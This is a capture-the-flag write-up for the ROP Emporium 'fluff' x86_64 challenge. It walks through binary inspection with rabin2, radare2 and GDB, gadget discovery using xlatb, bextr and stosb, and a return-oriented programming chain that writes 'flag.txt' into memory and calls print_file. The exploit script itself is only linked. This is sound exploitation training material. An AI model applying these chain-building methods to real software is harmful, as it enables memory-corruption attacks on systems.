# ROP Emporium - 06 fluff x86_64

## ELF Binary Info
> $ `rabin2 -I ./fluff`  
```
arch     x86
baddr    0x400000
binsz    6526
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    .
sanitiz  false
static   false
stripped false
subsys   linux
va       true
```
- canary false
- nx true (i.e. DEP enabled)
- pic false (i.e. not PIE)

## Find readable and writeable area of memory
- 1st terminal, run ELF binary and keep it open
- 2nd terminal, search proc maps of running process for readable and writeable memory:
> $ `cat /proc/$(pgrep -f ./fluff)/maps | grep rw`
```  
00601000-00602000 rw-p 00001000 fe:01 656467                             /<fluff_filepath>
[...]
```
- Step through binary in GDB and search for free memory between `00601000-00602000` to place "flag.txt" string
- Ensure there are null bytes after chosen memory address so that null terminator does not need to be added manually
> $ `gdb -q ./fluff`  
> (gdb) `start`  
> (gdb) `disass pwnme`  
```
Dump of assembler code for function pwnme:
[...]
   0x00007f160f97e92f <+133>:	call   0x7f160f97e770 <read@plt>
   0x00007f160f97e934 <+138>:	lea    rdi,[rip+0x110]        # 0x7f160f97ea4b
   0x00007f160f97e93b <+145>:	call   0x7f160f97e730 <puts@plt>
[...]
End of assembler dump.
```
- Set breakpoint after read() instruction
> (gdb) `b *pwnme+138`  
> (gdb) `c`  
```
Continuing.
fluff by ROP Emporium
x86_64

Go ahead and give me the input already!

> AAAAAAAA
```
> (gdb) `x/512gx 0x601000`  
```
[...]
0x6019f0:	0x0000000000000000	0x0000000000000000
0x601a00:	0x0000000000000000	0x0000000000000000
0x601a10:	0x0000000000000000	0x0000000000000000
[...]
```
- Memory address `0x601a00` looks like it matches criteria

## Look for ROP Gadgets
> $ `r2 -A ./fluff`  
- Most of the obvious ROP gadgets from earlier levels were not present in this binary, so we need to start devling into the realms of some of the more obscure instructions
- Have a look at the binary's symbols:
> [0x00400520]> `is`  
```
[...]
35  0x00000617 0x00400617 LOCAL  FUNC   17       usefulFunction
36  ---------- 0x00000000 LOCAL  FILE   0        /tmp/ccipmRw8.o
37  0x00000628 0x00400628 LOCAL  NOTYPE 0        questionableGadgets
[...]
```
- Print disassembly, 10 lines, starting from `questionableGadgets`
> [0x00400520]> `pd 10 @ loc.questionableGadgets`  
```
    ;-- questionableGadgets:
    0x00400628      d7             xlatb
    0x00400629      c3             ret
    0x0040062a      5a             pop rdx
    0x0040062b      59             pop rcx
    0x0040062c      4881c1f23e00.  add rcx, 0x3ef2
    0x00400633      c4e2e8f7d9     bextr rbx, rcx, rdx
    0x00400638      c3             ret
    0x00400639      aa             stosb byte [rdi], al
    0x0040063a      c3             ret
    0x0040063b      0f1f440000     nop dword [rax + rax]
```
- Disassemble function `usefulFunction`
> [0x00400520]> `pdf @ sym.usefulFunction`  
```
╭ 17: sym.usefulFunction ();
│           0x00400617      55             push rbp
│           0x00400618      4889e5         mov rbp, rsp
│           0x0040061b      bfc4064000     mov edi, str.nonexistent    ; 0x4006c4 ; "nonexistent"
│           0x00400620      e8ebfeffff     call sym.imp.print_file
│           0x00400625      90             nop
│           0x00400626      5d             pop rbp
╰           0x00400627      c3             ret
```
- Search for `pop rdi` instruction
>[0x00400520]> `/R pop rdi`  
```
  0x004006a3                 5f  pop rdi
  0x004006a4                 c3  ret
```

## Understanding Available Gadgets
### stosb (Store String): [Intel 64 and IA-32 Manual, page 1300](https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf)
- `stosb byte [rdi], al`: Store AL at address RDI
- NOTE: After the byte is transferred from the register to the memory location, the RDI register is incremented or decremented according to the setting of the DF flag in the EFLAGS register. If the DF flag is 0, the register is incremented; if the DF flag is 1, the register is decremented (the register is incremented or decremented by 1 for byte operations, by 2 for word operations, by 4 for doubleword operations).
- With this instruction we are able to store values in memory, but we need to be able to control AL to do this.

### xlatb (Table Look-up Translation): [Intel 64 and IA-32 Manual, page 1948](https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf)
- `xlatb`: Set AL to memory byte [RBX + unsigned AL]
- With this instruction we are able to set AL, but we need to be able to control RBX to do this.
- NOTE: Will need to correct for current value of AL each time this instruction is used.

### BEXTR (Bit Field Extract): [Intel 64 and IA-32 Manual, page 182](https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf)
- `bextr rbx, rcx, rdx`: Contiguous bitwise extract from RCX using RDX as control; store result in RBX
- Extracts contiguous bits from RCX using an index value and length value specified in RDX.
- Bit 7:0 of RDX specifies the starting bit position of bit extraction. A START value exceeding the operand size will not extract any bits from RDX.
- Bit 15:8 of RDX specifies the maximum number of bits (LENGTH) beginning at the START position to extract.
- Only bit positions up to (OperandSize -1) of RCX are extracted.
- The extracted bits are written to RBX, starting from the least significant bit.
- All higher order bits in RBX (starting at bit position LENGTH) are zeroed.
- RBX is cleared if no bits are extracted.
- Therefore RBX can be set if we can control RCX and RDX.
- We will want to set RDX to value 0x0000000000004000 (Bit 15:8 = 0x40 to extract 64 bits; Bit 7:0 = 0x00 to start from beginning)

### Contraints
- `pop rdx; pop rcx; add rcx, 0x3ef2`
- These instructions allow us to control RCX and RDX.
- NOTE: need to correct for `add rcx, 0x3ef2` by placing a value 0x3ef2 lower than desired value to pop RCX.

## Building ROP Chain
Goal is to store `"flag.txt"` string at known memory address, pop the memory address of this string, then call `print_file` function to get the flag. Therefore, working backwards, ROP chain will be:
- Address of `pop rdi` ROP gadget
- Value to pop into RDI == chosen memory address where we'll store target string `"flag.txt"` (e.g. `0x601a00` found earlier)
- Loop for each memory address pointing to byte of target string `"flag.txt"`:
  - Address of `pop rdx; pop rcx; add rcx, 0x3ef2` ROP gadget
  - Value to pop into RDX == `0x0000000000004000`
  - Value to pop into RCX == target memory address of bytes that match our target string `"flag.txt"`, but remembering to correct for (i.e. subtracting) 0x3ef2 gadget constraint and current value of AL (section below covers how bytes of target string were found in the ELF binary)
  - Address of `bextr rbx, rcx, rdx` ROP gadget
  - Address of `xlatb` ROP gadget (NOTE: this instruction sets AL to memory byte [RBX + unsigned AL], which why current value of AL is adjusted for when setting RCX value above)
  - Address of `stosb` ROP gadget (NOTE: this instruction auto-increments RDI, so there is no need to manually adjust for this)
- Address of `pop rdi` ROP gadget
- Value to pop into RDI == chosen memory address where we'll store target string `"flag.txt"` (e.g. `0x601a00` found earlier)
- Address of call to `print_file` function (i.e. `0x00400620` found earlier)

## Searching for Bytes of Target String in ELF Binary
- Search the ELF binary for bytes that match our target string `"flag.txt"` (may need to scroll up/down to locate them)
> $ `r2 -A ./fluff`  
> [0x00400520]> `V`  
```
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
[...]
0x004003c0  006c 6962 666c 7566 662e 736f 005f 5f67  .libfluff.so.__g
0x004003d0  6d6f 6e5f 7374 6172 745f 5f00 7072 696e  mon_start__.prin
[...]
0x004006c0  0100 0200 6e6f 6e65 7869 7374 656e 7400  ....nonexistent.
[...]
```
- memory address of "f" = 0x4003c8
- memory address of "l" = 0x4003c1
- memory address of "a" = 0x4003d6
- memory address of "g" = 0x4003cf
- memory address of "." = 0x4003c9
- memory address of "t" = 0x4003d8
- memory address of "x" = 0x4006c8
- memory address of "t" = 0x4003d8

## Correcting for Existing Value of AL
- For 2nd iteration of loop onward (e.g. characters `"l"`, `"a"`, `"g"`, `"."`, `"t"`, `"x"`, `"t"`), then the value of AL is known (i.e. the value of the **previous** character)
- However, for the first iteration (e.g. trying to set character `"f"`), we need to look at the state of the program's registers at the point of execution, so step through program in GDB:
> $ `gdb -q ./fluff`  
> (gdb) `start`  
> (gdb) `disass pwnme`  
```
   0x00007efc2f06392f <+133>:	call   0x7efc2f063770 <read@plt>
   0x00007efc2f063934 <+138>:	lea    rdi,[rip+0x110]        # 0x7efc2f063a4b
   0x00007efc2f06393b <+145>:	call   0x7efc2f063730 <puts@plt>
   0x00007efc2f063940 <+150>:	nop
   0x00007efc2f063941 <+151>:	leave  
   0x00007efc2f063942 <+152>:	ret   
```
- Set breakpoint at `ret` instruction and continue
> (gdb) `b *pwnme+152`  
> (gdb) `c`  
```
Continuing.
fluff by ROP Emporium
x86_64

You know changing these strings means I have to rewrite my solutions...
> AAAAAAAA
Thank you!
```
- Look up current value of AL:
> (gdb) `p/x $al`  
```$1 = 0xb```
- Therefore, need to adjust for `0x0b` in first iteration of loop

## Get Flag
- Place script the [get_flag.py](./get_flag.py) Python script in the same folder as the challenge's files, then run the script:
> $ `python get_flag.py`  
```
fluff by ROP Emporium
x86_64

You know changing these strings means I have to rewrite my solutions...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
```
